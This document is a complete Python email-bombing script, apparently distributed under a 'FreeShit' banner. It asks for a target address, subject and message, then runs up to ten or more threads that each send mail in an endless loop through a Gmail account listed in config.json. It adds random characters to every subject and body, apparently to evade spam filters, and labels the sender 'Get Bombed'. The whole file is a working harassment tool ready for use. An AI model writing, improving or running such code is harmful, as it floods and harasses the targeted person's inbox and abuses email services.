import smtplib, json, string, random, threading,colorama,socks
from colorama import Fore, init
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText

init()
banner = f"""
{Fore.BLUE}███████╗██████╗ ███████╗███████╗███████╗██╗  ██╗██╗████████╗
{Fore.MAGENTA}██╔════╝██╔══██╗██╔════╝██╔════╝██╔════╝██║  ██║██║╚══██╔══╝  
{Fore.BLUE}█████╗  ██████╔╝█████╗  █████╗  ███████╗███████║██║   ██║      
{Fore.MAGENTA}██╔══╝  ██╔══██╗██╔══╝  ██╔══╝  ╚════██║██╔══██║██║   ██║    
{Fore.BLUE}██║     ██║  ██║███████╗███████╗███████║██║  ██║██║   ██║     
{Fore.MAGENTA}╚═╝     ╚═╝  ╚═╝╚══════╝╚══════╝╚══════╝╚═╝  ╚═╝╚═╝   ╚═╝    
{Fore.BLUE}Created By FreeShit ║ Developer: segations#2344 ║getfreeshit.today
"""

target = ''
subject = ''
message = ''
successful = 0
failed = 0

f = open('config.json')
config = json.load(f)
f.close()

def RandomCharacters(length):
    letters = string.ascii_letters
    digits = string.digits
    result_str = ''.join(random.choice(letters + digits) for i in range(length))
    return result_str

def Main():
    while True:
        global successful
        global failed
                
        gmail_email = config['Email']
        gmail_password = config['AppPassword']
        f.close()

        msg = MIMEMultipart()
        msg['From'] = f'"Get Bombed" <{gmail_email}>'
        msg['To'] = target
        msg['Subject'] = subject + "_" + RandomCharacters(13)
        msg.attach(MIMEText(message + "_" + RandomCharacters(7)))
        try:
            server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
            server.ehlo()
            server.login(gmail_email, gmail_password)
            server.sendmail(gmail_email, target, msg.as_string())
            server.close()
            successful += 1

            print(f'[!] Email sent - TYPE: Success ({successful})')
        except Exception as exception:
            print("Error: %s!\n\n" % exception)


thread_array = []
def start():
    print(banner)
    try:
        global target,subject, message
        target = input(f'{Fore.MAGENTA}[?] Who is the target >> ')
        subject = input(f'{Fore.BLUE}[?] What subject >> ')
        message = input(f'{Fore.MAGENTA}[?] What message >> ')
        threads = int(input(f'{Fore.BLUE}[?] How many threads [max is 10 for gmail or Account ban] >> '))
       # proxys = input(f'{Fore.MAGENTA}[?] Do you want to Use Proxies y or n >> ')
        if threads > 10:
            print(f"{Fore.MAGENTA}[!] You are using over 10 threads you have been warned...")
        else:
            print(f"{Fore.MAGENTA}[!] Starting Now...")
        for i in range(threads):
            Threading = threading.Thread(target=Main, daemon=True)
            thread_array.append(Threading)
            Threading.start()
        for thread in thread_array:
            thread.join()
    except:
        print('Error: unable to start thread')

start()